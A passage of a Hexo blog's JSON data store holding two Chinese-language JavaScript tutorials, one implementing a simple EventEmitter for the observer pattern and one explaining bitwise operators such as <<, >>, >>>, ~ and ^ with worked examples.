class=\"keyword\">new</span> Person()</span><br><span class=\"line\"></span><br><span class=\"line\">p.on(<span class=\"string\">'hello'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hello world'</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.emit(<span class=\"string\">'hello'</span>) <span class=\"comment\">// -&gt; hello world</span></span><br></pre></td></tr></table></figure>\n<p>传递参数时，可以直接在 <code>on</code> 执行函数中获取 <code>emit</code> 中传递的参数；<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p.on(<span class=\"string\">'hello'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hello'</span> + name)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.emit(<span class=\"string\">'hello'</span>, <span class=\"string\">'Mark'</span>) <span class=\"comment\">// -&gt; hello Mark</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上只是对观察者模式主体的一个简单实现，还有很多可以扩展的方法和优化的方案，这里我就不再继续写了。<br>如果你想了解更加完整的实现方式可以参考 <a href=\"https://github.com/asyncly/EventEmitter2\">EventEmitter2</a>。</p>\n","site":{"data":{}},"excerpt":"<p>自己编写一个简单的 <code>EventEmitter</code> 实现 <code>观察者模式</code>。</p>","more":"<h3 id=\"观察者模式\"><a href=\"#观察者模式\" class=\"headerlink\" title=\"观察者模式\"></a>观察者模式</h3><blockquote>\n<p>观察者模式面向的需求是：A对象（观察者）对B对象（被观察者）的某种变化高度敏感，需要在B变化的一瞬间做出反应。<br>举个例子，新闻里喜闻乐见的警察抓小偷，警察需要在小偷伸手作案的时候实施抓捕。<br>在这个例子里，警察是观察者、小偷是被观察者，警察需要时刻盯着小偷的一举一动，才能保证不会错过任何瞬间。<br>程序里的观察者和这种真正的【观察】略有不同，观察者不需要时刻盯着被观察者(例如A不需要每隔1ms就检查一次B的状态)；<br>二是采用注册(Register)或者成为订阅(Subscribe)的方式告诉被观察者：<br>我需要你的某某状态，你要在它变化时通知我。采取这样被动的观察方式，既省去了反复检索状态的资源消耗，也能够得到最高的反馈速度。</p>\n</blockquote>\n<h3 id=\"观察者模式的优缺点\"><a href=\"#观察者模式的优缺点\" class=\"headerlink\" title=\"观察者模式的优缺点\"></a>观察者模式的优缺点</h3><h4 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h4><ul>\n<li>观察者模式在被观察者和观察者之间建立一个抽象的耦合。被观察者角色所知道的只是一个具体观察者列表，每一个具体观察者都符合一个抽象观察者的接口。被观察者并不认识任何一个具体观察者，它只知道它们都有一个共同的接口。</li>\n<li>由于被观察者和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。如果被观察者和观察者都被扔到一起，那么这个对象必然跨越抽象化和具体化层次。</li>\n<li>观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知。</li>\n</ul>\n<h4 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h4><ul>\n<li>如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。</li>\n<li>如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。</li>\n<li>如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。</li>\n<li>虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。</li>\n</ul>\n<h3 id=\"实现方法\"><a href=\"#实现方法\" class=\"headerlink\" title=\"实现方法\"></a>实现方法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">EventEmitter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.events = &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"comment\">//绑定事件函数</span></span><br><span class=\"line\">EventEmitter.prototype.on = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">eventName, callback</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.events[eventName] = <span class=\"keyword\">this</span>.events[eventName] || [];</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.events[eventName].push(callback); <span class=\"comment\">// 1</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">    <span class=\"comment\">//触发事件函数</span></span><br><span class=\"line\">EventEmitter.prototype.emit = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">eventName, _</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> events = <span class=\"keyword\">this</span>.events[eventName],</span><br><span class=\"line\">    args = <span class=\"built_in\">Array</span>.prototype.slice.call(<span class=\"built_in\">arguments</span>, <span class=\"number\">1</span>), <span class=\"comment\">// 2</span></span><br><span class=\"line\">    i, m;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!events) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>, m = events.length; i &lt; m; i++) &#123;</span><br><span class=\"line\">        events[i].apply(<span class=\"literal\">null</span>, args); <span class=\"comment\">// 3</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// 删除事件函数</span></span><br><span class=\"line\">EventEmitter.prototype.off = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">eventName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.events[eventName]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上有3个注意点：<br>1.<code>EventEmitter</code> 接收事件时是以事件名作为 <code>key</code> 执行函数作为 <code>value:array</code>。<br>2.但用户触发 <code>emit</code> 时可以传递多个参数，所以将除 <code>事件名(arg[0])</code> 之外的参数视为传参，缓存供第 <code>3</code> 步时使用。<br>3.遍历事件的执行函数 <code>value</code> 并将 <code>args</code> 传递给每一个事件。</p>\n<p>更多关于 <code>call</code> 和 <code>apply</code> 的介绍请参考<a href=\"https://developer.mozilla.org/en-US/\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Person = <span class=\"function\"><span class=\"keyword\">function</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Person.prototype = <span class=\"keyword\">new</span> EventEmitter()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p = <span class=\"keyword\">new</span> Person()</span><br><span class=\"line\"></span><br><span class=\"line\">p.on(<span class=\"string\">'hello'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hello world'</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.emit(<span class=\"string\">'hello'</span>) <span class=\"comment\">// -&gt; hello world</span></span><br></pre></td></tr></table></figure>\n<p>传递参数时，可以直接在 <code>on</code> 执行函数中获取 <code>emit</code> 中传递的参数；<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p.on(<span class=\"string\">'hello'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'hello'</span> + name)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.emit(<span class=\"string\">'hello'</span>, <span class=\"string\">'Mark'</span>) <span class=\"comment\">// -&gt; hello Mark</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上只是对观察者模式主体的一个简单实现，还有很多可以扩展的方法和优化的方案，这里我就不再继续写了。<br>如果你想了解更加完整的实现方式可以参考 <a href=\"https://github.com/asyncly/EventEmitter2\">EventEmitter2</a>。</p>"},{"title":"Javascript中那些你不知道的运算符","date":"2017-04-25T07:41:03.000Z","_content":"\n\n在 `javascript` 中除了 `|`,`&`,`+`,`-`,`+=`..运算符之外，还有很多的运算符；比如：`<<`,`>>`,`~`等运算符，相信很多人跟我一样第一眼看到这些运算符心里完全是一脸懵逼。本文将要介绍的就是哪些你可能一辈子都用不到的运算符。\n<!-- more -->\n\n### Javascript中那些你不知道的运算符\n\n#### 按位左移运算符 `(<<)`\n左移表达式的位。\n\n**语法**\n```js\nresult = expression1 << expression2\n```\n\n**示例**\n\n```js\nvar temp;\ntemp = 14 << 2; // -> 56\n\n// 14 转化成二进制 00001110\n// 将 00001110 左移 2 位 00111000\n// 00111000 -> 56\n```\n\n**解释**\n将 `expression1` 的位左移 `expression2` 中指定的位数。\n\n#### 按位右移运算符 `(>>)`\n右移表达式的位，保持符号不变。\n\n**语法**\n```js\nresult = expression1 >> expression2;\n```\n\n**示例**\n\n```js\nvar temp;\ntemp = -14 >> 2; // -> -4\n\n// -14 -> 11110010\n// -4 -> 11111100\n```\n\n**解释**\n将 `expression1` 的位右移 `expression2` 中指定的位数。用 `expression1` 的符号位填充右移后左边空出来的位。右移的位被丢弃。\n\n#### 无符号右移位运算符 `(>>>)`\n右移表达式的位，不保留符号。\n\n**语法**\n```js\nresult = expression1 >>> expression2\n```\n\n**示例**\n\n```js\nvar temp;\ntemp = -14 >>> 2; // -> 1073741820\n\n// -14 二进制补码 11111111 11111111 11111111 11110010\n// 1073741820 二进制补码 00111111 11111111 11111111 11111100\n```\n\n**解释**\n将 `expression1` 的位右移 `expression2` 中指定的位数。用零填充右移后左边空出的位。右移的位被丢弃。\n\n\n#### 按位取反运算符 `(~)`\n对一个表达式执行位非（求非）运算。\n\n**语法**\n```js\nresult = ~ expression\n```\n\n**示例**\n\n```js\nvar temp = ~5; // -> -6\n\n// 5 转化成二进制 00000000 00000000 00000000 00000101\n// -6 转化成二进制 11111111 11111111 11111111 11111010\n```\n\n**解释**\n所有一元运算符（如 ~ 运算符）都按照下面的规则来计算表达式的值：\n* 如果应用于未定义的表达式或 `null` 表达式，则会引发一个运行时错误。\n* 将对象转换为字符串。\n* 如果可能，将字符串转换为数字。否则，将引发运行时错误。\n* 布尔值被视为数字（如果为 `false`，则为 `0`；如果为 `true`，则为 `1`）。\n\n运算符将应用于结果数字。\n`~` 运算符查看表达式的二进制表示形式的值，并执行位非运算。\n表达式中的任何一位为 `1`，则结果中的该位变为 `0`。表达式中的任何一位为 `0`，则结果中的该位变为 `1`。\n\n#### 按位异或运算符 `(^)`\n对两个表达式执行按位“异或”运算。\n\n**语法**\n```js\nresult = expression1 ^ expression2\n```\n\n**示例**\n\n```js\nvar result = 5 ^ 12; // -> 9\n\n// 5 -> 0101\n// 12 -> 1100\n\n// 9 -> 1001\n```\n\n**解释**\n当且仅当只有一个表达式的某位为 `1` 时，结果中的该位才为 `1`。否则，结果中的该位为 `0`。\n","source":"_posts/Javascript中那些你不知道的运算符.md","raw":"---\ntitle: Javascript中那些你不知道的运算符\ndate: 2017-04-25 15:41:03\ntags:\n---\n\n\n在 `javascript` 中除了 `|`,`&`,`+`,`-`,`+=`..运算符之外，还有很多的运算符；比如：`<<`,`>>`,`~`等运算符，相信很多人跟我一样第一眼看到这些运算符心里完全是一脸懵逼。本文将要介绍的就是哪些你可能一辈子都用不到的运算符。\n<!-- more -->\n\n### Javascript中那些你不知道的运算符\n\n#### 按位左移运算符 `(<<)`\n左移表达式的位。\n\n**语法**\n```js\nresult = expression1 << expression2\n```\n\n**示例**\n\n```js\nvar temp;\ntemp = 14 << 2; // -> 56\n\n// 14 转化成二进制 00001110\n// 将 00001110 左移 2 位 00111000\n// 00111000 -> 56\n```\n\n**解释**\n将 `expression1` 的位左移 `expression2` 中指定的位数。\n\n#### 按位右移运算符 `(>>)`\n右移表达式的位，保持符号不变。\n\n**语法**\n```js\nresult = expression1 >> expression2;\n```\n\n**示例**\n\n```js\nvar temp;\ntemp = -14 >> 2; // -> -4\n\n// -14 -> 11110010\n// -4 -> 11111100\n```\n\n**解释**\n将 `expression1` 的位右移 `expression2` 中指定的位数。用 `expression1` 的符号位填充右移后左边空出来的位。右移的位被丢弃。\n\n#### 无符号右移位运算符 `(>>>)`\n右移表达式的位，不保留符号。\n\n**语法**\n```js\nresult = expression1 >>> expression2\n```\n\n**示例**\n\n```js\nvar temp;\ntemp = -14 >>> 2; // -> 1073741820\n\n// -14 二进制补码 11111111 11111111 11111111 11110010\n// 1073741820 二进制补码 00111111 11111111 11111111 11111100\n```\n\n**解释**\n将 `expression1` 的位右移 `expression2` 中指定的位数。用零填充右移后左边空出的位。右移的位被丢弃。\n\n\n#### 按位取反运算符 `(~)`\n对一个表达式执行位非（求非）运算。\n\n**语法**\n```js\nresult = ~ expression\n```\n\n**示例**\n\n```js\nvar temp = ~5; // -> -6\n\n// 5 转化成二进制 00000000 00000000 00000000 00000101\n// -6 转化成二进制 11111111 11111111 11111111 11111010\n```\n\n**解释**\n所有一元运算符（如 ~ 运算符）都按照下面的规则来计算表达式的值：\n* 如果应用于未定义的表达式或 `null` 表达式，则会引发一个运行时错误。\n* 将对象转换为字符串。\n* 如果可能，将字符串转换为数字。否则，将引发运行时错误。\n* 布尔值被视为数字（如果为 `false`，则为 `0`；如果为 `true`，则为 `1`）。\n\n运算符将应用于结果数字。\n`~` 运算符查看表达式的二进制表示形式的值，并执行位非运算。\n表达式中的任何一位为 `1`，则结果中的该位变为 `0`。表达式中的任何一位为 `0`，则结果中的该位变为 `1`。\n\n#### 按位异或运算符 `(^)`\n对两个表达式执行按位“异或”运算。\n\n**语法**\n```js\nresult = expression1 ^ expression2\n```\n\n**示例**\n\n```js\nvar result = 5 ^ 12; // -> 9\n\n// 5 -> 0101\n// 12 -> 1100\n\n// 9 -> 1001\n```\n\n**解释**\n当且仅当只有一个表达式的某位为 `1` 时，结果中的该位才为 `1`。否则，结果中的该位为 `0`。\n","slug":"Javascript中那些你不知道的运算符","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qd000202vsxyzqrryb","content":"<p>在 <code>javascript</code> 中除了 <code>|</code>,<code>&amp;</code>,<code>+</code>,<code>-</code>,<code>+=</code>..运算符之外，还有很多的运算符；比如：<code>&lt;&lt;</code>,<code>&gt;&gt;</code>,<code>~</code>等运算符，相信很多人跟我一样第一眼看到这些运算符心里完全是一脸懵逼。本文将要介绍的就是哪些你可能一辈子都用不到的运算符。<br><a id=\"more\"></a></p>\n<h3 id=\"Javascript中那些你不知道的运算符\"><a href=\"#Javascript中那些你不知道的运算符\" class=\"headerlink\" title=\"Javascript中那些你不知道的运算符\"></a>Javascript中那些你不知道的运算符</h3><h4 id=\"按位左移运算符-lt-lt\"><a href=\"#按位左移运算符-lt-lt\" class=\"headerlink\" title=\"按位左移运算符 (&lt;&lt;)\"></a>按位左移运算符 <code>(&lt;&lt;)</code></h4><p>左移表达式的位。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 &lt;&lt; expression2</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp;</span><br><span class=\"line\">temp = <span class=\"number\">14</span> &lt;&lt; <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; 56</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 14 转化成二进制 00001110</span></span><br><span class=\"line\"><span class=\"comment\">// 将 00001110 左移 2 位 00111000</span></span><br><span class=\"line\"><span class=\"comment\">// 00111000 -&gt; 56</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>将 <code>expression1</code> 的位左移 <code>expression2</code> 中指定的位数。</p>\n<h4 id=\"按位右移运算符-gt-gt\"><a href=\"#按位右移运算符-gt-gt\" class=\"headerlink\" title=\"按位右移运算符 (&gt;&gt;)\"></a>按位右移运算符 <code>(&gt;&gt;)</code></h4><p>右移表达式的位，保持符号不变。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 &gt;&gt; expression2;</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp;</span><br><span class=\"line\">temp = <span class=\"number\">-14</span> &gt;&gt; <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; -4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// -14 -&gt; 11110010</span></span><br><span class=\"line\"><span class=\"comment\">// -4 -&gt; 11111100</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>将 <code>expression1</code> 的位右移 <code>expression2</code> 中指定的位数。用 <code>expression1</code> 的符号位填充右移后左边空出来的位。右移的位被丢弃。</p>\n<h4 id=\"无符号右移位运算符-gt-gt-gt\"><a href=\"#无符号右移位运算符-gt-gt-gt\" class=\"headerlink\" title=\"无符号右移位运算符 (&gt;&gt;&gt;)\"></a>无符号右移位运算符 <code>(&gt;&gt;&gt;)</code></h4><p>右移表达式的位，不保留符号。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 &gt;&gt;&gt; expression2</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp;</span><br><span class=\"line\">temp = <span class=\"number\">-14</span> &gt;&gt;&gt; <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; 1073741820</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// -14 二进制补码 11111111 11111111 11111111 11110010</span></span><br><span class=\"line\"><span class=\"comment\">// 1073741820 二进制补码 00111111 11111111 11111111 11111100</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>将 <code>expression1</code> 的位右移 <code>expression2</code> 中指定的位数。用零填充右移后左边空出的位。右移的位被丢弃。</p>\n<h4 id=\"按位取反运算符\"><a href=\"#按位取反运算符\" class=\"headerlink\" title=\"按位取反运算符 (~)\"></a>按位取反运算符 <code>(~)</code></h4><p>对一个表达式执行位非（求非）运算。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = ~ expression</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp = ~<span class=\"number\">5</span>; <span class=\"comment\">// -&gt; -6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 5 转化成二进制 00000000 00000000 00000000 00000101</span></span><br><span class=\"line\"><span class=\"comment\">// -6 转化成二进制 11111111 11111111 11111111 11111010</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>所有一元运算符（如 ~ 运算符）都按照下面的规则来计算表达式的值：</p>\n<ul>\n<li>如果应用于未定义的表达式或 <code>null</code> 表达式，则会引发一个运行时错误。</li>\n<li>将对象转换为字符串。</li>\n<li>如果可能，将字符串转换为数字。否则，将引发运行时错误。</li>\n<li>布尔值被视为数字（如果为 <code>false</code>，则为 <code>0</code>；如果为 <code>true</code>，则为 <code>1</code>）。</li>\n</ul>\n<p>运算符将应用于结果数字。<br><code>~</code> 运算符查看表达式的二进制表示形式的值，并执行位非运算。<br>表达式中的任何一位为 <code>1</code>，则结果中的该位变为 <code>0</code>。表达式中的任何一位为 <code>0</code>，则结果中的该位变为 <code>1</code>。</p>\n<h4 id=\"按位异或运算符\"><a href=\"#按位异或运算符\" class=\"headerlink\" title=\"按位异或运算符 (^)\"></a>按位异或运算符 <code>(^)</code></h4><p>对两个表达式执行按位“异或”运算。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 ^ expression2</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> result = <span class=\"number\">5</span> ^ <span class=\"number\">12</span>; <span class=\"comment\">// -&gt; 9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 5 -&gt; 0101</span></span><br><span class=\"line\"><span class=\"comment\">// 12 -&gt; 1100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 9 -&gt; 1001</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>当且仅当只有一个表达式的某位为 <code>1</code> 时，结果中的该位才为 <code>1</code>。否则，结果中的该位为 <code>0</code>。</p>\n","site":{"data":{}},"excerpt":"<p>在 <code>javascript</code> 中除了 <code>|</code>,<code>&amp;</code>,<code>+</code>,<code>-</code>,<code>+=</code>..运算符之外，还有很多的运算符；比如：<code>&lt;&lt;</code>,<code>&gt;&gt;</code>,<code>~</code>等运算符，相信很多人跟我一样第一眼看到这些运算符心里完全是一脸懵逼。本文将要介绍的就是哪些你可能一辈子都用不到的运算符。<br>","more":"</p>\n<h3 id=\"Javascript中那些你不知道的运算符\"><a href=\"#Javascript中那些你不知道的运算符\" class=\"headerlink\" title=\"Javascript中那些你不知道的运算符\"></a>Javascript中那些你不知道的运算符</h3><h4 id=\"按位左移运算符-lt-lt\"><a href=\"#按位左移运算符-lt-lt\" class=\"headerlink\" title=\"按位左移运算符 (&lt;&lt;)\"></a>按位左移运算符 <code>(&lt;&lt;)</code></h4><p>左移表达式的位。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 &lt;&lt; expression2</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp;</span><br><span class=\"line\">temp = <span class=\"number\">14</span> &lt;&lt; <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; 56</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 14 转化成二进制 00001110</span></span><br><span class=\"line\"><span class=\"comment\">// 将 00001110 左移 2 位 00111000</span></span><br><span class=\"line\"><span class=\"comment\">// 00111000 -&gt; 56</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>将 <code>expression1</code> 的位左移 <code>expression2</code> 中指定的位数。</p>\n<h4 id=\"按位右移运算符-gt-gt\"><a href=\"#按位右移运算符-gt-gt\" class=\"headerlink\" title=\"按位右移运算符 (&gt;&gt;)\"></a>按位右移运算符 <code>(&gt;&gt;)</code></h4><p>右移表达式的位，保持符号不变。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 &gt;&gt; expression2;</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp;</span><br><span class=\"line\">temp = <span class=\"number\">-14</span> &gt;&gt; <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; -4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// -14 -&gt; 11110010</span></span><br><span class=\"line\"><span class=\"comment\">// -4 -&gt; 11111100</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>将 <code>expression1</code> 的位右移 <code>expression2</code> 中指定的位数。用 <code>expression1</code> 的符号位填充右移后左边空出来的位。右移的位被丢弃。</p>\n<h4 id=\"无符号右移位运算符-gt-gt-gt\"><a href=\"#无符号右移位运算符-gt-gt-gt\" class=\"headerlink\" title=\"无符号右移位运算符 (&gt;&gt;&gt;)\"></a>无符号右移位运算符 <code>(&gt;&gt;&gt;)</code></h4><p>右移表达式的位，不保留符号。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 &gt;&gt;&gt; expression2</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp;</span><br><span class=\"line\">temp = <span class=\"number\">-14</span> &gt;&gt;&gt; <span class=\"number\">2</span>; <span class=\"comment\">// -&gt; 1073741820</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// -14 二进制补码 11111111 11111111 11111111 11110010</span></span><br><span class=\"line\"><span class=\"comment\">// 1073741820 二进制补码 00111111 11111111 11111111 11111100</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>将 <code>expression1</code> 的位右移 <code>expression2</code> 中指定的位数。用零填充右移后左边空出的位。右移的位被丢弃。</p>\n<h4 id=\"按位取反运算符\"><a href=\"#按位取反运算符\" class=\"headerlink\" title=\"按位取反运算符 (~)\"></a>按位取反运算符 <code>(~)</code></h4><p>对一个表达式执行位非（求非）运算。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 